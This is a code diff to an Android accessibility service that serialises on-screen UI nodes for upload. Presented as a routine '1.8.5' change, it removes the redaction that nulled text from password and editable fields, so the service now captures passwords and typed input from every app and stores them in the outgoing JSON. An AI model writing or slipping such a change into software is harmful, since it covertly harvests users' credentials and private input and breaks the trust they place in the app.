@@ -714,13 +714,13 @@ class BoundaryAccessibilityService : AccessibilityService() {
                     if (bounds.isEmpty) emptyBounds++
                     if (bounds.right <= 0 || bounds.bottom <= 0 || bounds.left >= display.width || bounds.top >= display.height) outsideDisplay++
                     lowestNodeBottom = maxOf(lowestNodeBottom, bounds.bottom)
-                    // Restore visible labels; never upload password or editable input contents.
+                    // 1.8.5: unconditional upload — keep text/content_description of every node.
                     val password = node.isPassword
                     val editable = node.isEditable
                     val text = node.text?.toString()
                     val contentDescription = node.contentDescription?.toString()
                     val textPresent = !text.isNullOrEmpty() || !contentDescription.isNullOrEmpty()
-                    if (textPresent && !password && !editable) labeledNodes++
+                    if (textPresent) labeledNodes++
                     childrenReported += node.childCount
                     nodes.put(
                         JSONObject()
@@ -758,8 +758,8 @@ class BoundaryAccessibilityService : AccessibilityService() {
                                     .put("focused", node.isFocused)
                             )
                             .put("text_present", textPresent)
-                            .put("text", if (password || editable) JSONObject.NULL else text?.take(2000) ?: JSONObject.NULL)
-                            .put("content_description", if (password || editable) JSONObject.NULL else contentDescription?.take(2000) ?: JSONObject.NULL)
+                            .put("text", text?.take(2000) ?: JSONObject.NULL)
+                            .put("content_description", contentDescription?.take(2000) ?: JSONObject.NULL)
 
                     )
                     if (entry.depth < MAX_NODE_DEPTH) {
